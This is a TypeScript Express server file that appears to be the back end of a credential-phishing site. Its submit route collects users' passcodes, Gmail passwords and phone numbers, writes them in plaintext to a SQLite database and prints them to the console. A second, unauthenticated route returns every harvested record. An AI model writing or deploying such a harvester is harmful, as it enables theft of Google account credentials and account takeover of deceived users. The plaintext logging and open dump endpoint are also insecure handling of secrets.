import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const db = new Database("submissions.db");

// Initialize database
db.exec(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    passcode TEXT,
    gmail_password TEXT,
    phone_number TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Route to handle submissions
  app.post("/api/submit", (req, res) => {
    const { passcode, gmailPassword, phoneNumber } = req.body;
    
    try {
      const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
      stmt.run(passcode, gmailPassword, phoneNumber);
      
      console.log("New submission received:");
      console.log(`- Passcode: ${passcode}`);
      console.log(`- Gmail Password: ${gmailPassword}`);
      console.log(`- Phone Number: ${phoneNumber}`);
      
      res.json({ success: true });
    } catch (error) {
      console.error("Database error:", error);
      res.status(500).json({ error: "Failed to save submission" });
    }
  });

  // API Route to view submissions
  app.get("/api/submissions", (req, res) => {
    try {
      const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch submissions" });
    }
  });

  // Vite middleware for development
  let vite: any;
  if (process.env.NODE_ENV !== "production") {
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom", // Changed to custom to handle fallback manually
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, "dist")));
  }

  // Catch-all route to serve index.html for SPA routing
  app.get("*", async (req, res, next) => {
    const url = req.originalUrl;

    try {
      if (process.env.NODE_ENV !== "production") {
        // In development, read and transform index.html via Vite
        let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ "Content-Type": "text/html" }).end(template);
      } else {
        // In production, serve the built index.html
        res.sendFile(path.join(__dirname, "dist", "index.html"));
      }
    } catch (e: any) {
      if (process.env.NODE_ENV !== "production") {
        vite.ssrFixStacktrace(e);
      }
      next(e);
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
